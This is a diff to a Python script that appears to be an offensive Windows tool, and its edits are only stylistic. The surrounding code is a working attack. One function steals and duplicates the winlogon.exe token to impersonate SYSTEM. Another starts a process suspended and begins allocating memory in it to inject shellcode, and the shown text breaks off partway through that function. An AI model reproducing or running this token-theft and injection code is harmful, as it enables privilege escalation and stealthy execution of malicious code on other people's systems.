@@ -740,7 +740,7 @@ def getppid(pname):
 
 
     if Process32First(hProcessSnap, ctypes.byref(pe32)) == 0:
-     print("[x] - Failed getting first process.") 
+     print(f"[x] - Failed getting first process.")
      return
 
     while True:
@@ -751,19 +751,19 @@ def getppid(pname):
          return None
     CloseHandle(hProcessSnap)
 
-
+@requires_os('windows')
 def impersonate_system(): 
      try: 
         hp = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, getppid("winlogon.exe"))
         th = win32security.OpenProcessToken(hp, TOKEN_DUPLICATE)
         new_tokenh = win32security.DuplicateTokenEx(th, 2, TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())
         win32security.ImpersonateLoggedOnUser(new_tokenh)
-        print('[+] - Impersonated System Token via Winlogon')
+        print(f"[+] - Impersonated System Token via Winlogon")
         win32api.CloseHandle(hp)
      except Exception as e:
-            print('[x] - Failed To Impersonate System Token via Winlogon')
+            print(f"[x] - Failed To Impersonate System Token via Winlogon")
             
-            
+@requires_os('windows')
 def Inject(path, shellcode):
     # created suspended process
     info = win32process.CreateProcess(None, path, None, None, False, 0x04, None, None, win32process.STARTUPINFO())
@@ -772,7 +772,7 @@ def Inject(path, shellcode):
     memcommit = 0x00001000
 
     if info[0].handle > 0 :
-       print(f'[+] - Created {path} Suspended')
+       print(f"[+] - Created {path} Suspended")
     shellcode_length = len(shellcode)
     process_handle = info[0].handle  # phandle
     VirtualAllocEx = windll.kernel32.VirtualAllocEx
